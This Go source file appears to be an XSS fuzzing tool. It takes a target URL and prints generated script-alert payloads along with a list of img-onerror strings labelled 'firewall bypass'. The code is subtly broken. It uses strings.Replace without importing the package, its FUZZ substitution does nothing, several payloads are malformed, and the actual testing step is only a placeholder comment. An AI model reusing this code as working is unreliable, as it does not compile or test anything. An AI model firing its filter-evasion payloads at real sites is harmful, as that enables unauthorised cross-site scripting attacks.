package main

import (
	"flag"
	"fmt"
	"math/rand"
	"time"
)

const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+{}|[]\\:\";'<>?,./`~"

var randSeed *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))

func generateRandomString(length int) string {
	randomString := make([]byte, length)
	for i := range randomString {
		randomString[i] = charset[randSeed.Intn(len(charset))]
	}
	return string(randomString)
}

func generateSymmetricPayloads(count, length int) []string {
	payloads := make([]string, count)
	for i := 0; i < count; i++ {
		payloads[i] = generateRandomString(length)
	}
	return payloads
}

func generateAsymmetricPayloads(symmetricPayloads []string) []string {
	payloads := make([]string, len(symmetricPayloads))
	for i, payload := range symmetricPayloads {
		payloads[i] = fmt.Sprintf("<script>alert('%s');</script>", payload)
	}
	return payloads
}

func generateFirewallBypassPayloads() []string {
	firewallBypassPayloads := []string{
		"<img src=x onerror=alert(1)>",
		"<img src=x onerror=alert`1`>",
		"<img src=x onerror=alert'1'>",
		"<img src=x onerror=alert(1)//",
		"<img src=x onerror=alert(String.fromCharCode(1))>",
		"<img src=x onerror='alert(1)'>",
		"<img src=x onerror='alert(1)//",
		"<img src=x onerror='alert(1)'>",
	}
	return firewallBypassPayloads
}

func main() {
	var target string
	flag.StringVar(&target, "u", "", "Target URL to test for XSS vulnerabilities")
	flag.Parse()

	if target == "" {
		fmt.Println("Please provide a target URL using the -u flag.")
		return
	}

	// FUZZ variable for XSS testing
	fuzz := "FUZZ"

	// Number of payloads to generate
	payloadCount := 10

	// Length of each payload
	payloadLength := 20

	// Generate symmetric payloads
	symmetricPayloads := generateSymmetricPayloads(payloadCount, payloadLength)
	fmt.Println("Symmetric Payloads:")
	for _, payload := range symmetricPayloads {
		fmt.Println(payload)
	}

	// Generate asymmetric payloads
	asymmetricPayloads := generateAsymmetricPayloads(symmetricPayloads)
	fmt.Println("\nAsymmetric Payloads:")
	for _, payload := range asymmetricPayloads {
		fmt.Println(payload)
	}

	// Generate firewall bypass payloads
	firewallBypassPayloads := generateFirewallBypassPayloads()
	fmt.Println("\nFirewall Bypass Payloads:")
	for _, payload := range firewallBypassPayloads {
		fmt.Println(payload)
	}

	// Replace FUZZ with actual payload in target URL
	target = strings.Replace(target, "FUZZ", fuzz, -1)

	fmt.Printf("\nTesting target URL: %s\n", target)
	// Implement XSS vulnerability testing logic here...
}
